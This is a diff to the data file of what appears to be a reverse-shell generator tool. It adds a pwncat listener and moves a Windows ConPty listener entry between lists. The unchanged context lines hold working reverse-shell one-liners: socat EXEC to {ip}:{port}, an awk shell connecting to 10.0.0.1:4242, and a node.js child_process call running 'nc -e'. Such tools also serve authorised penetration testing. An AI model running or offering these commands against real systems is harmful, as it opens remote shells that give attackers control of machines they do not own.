@@ -1,11 +1,12 @@
 const rsgData = {
 
     listenerCommands: [
+        ['pwncat', 'python3 -m pwncat -lp {port}'],
         ['nc', 'nc -lvnp {port}'],
         ['rlwrap + nc', 'rlwrap nc -lvnp {port}'],
+        ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
         ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
-        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
-	['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}']
+        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}']
     ],
 
     shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
@@ -38,8 +39,8 @@ const rsgData = {
         ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
         ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
         ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
-        ['node.js', 'require(\'child_process\').exec(\'nc -e /bin/{shell} {ip} {port}\')'],
-	['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}']
+        ['node.js', 'require(\'child_process\').exec(\'nc -e /bin/{shell} {ip} {port}\')']
+        
     ],
 
     specialCommands: {
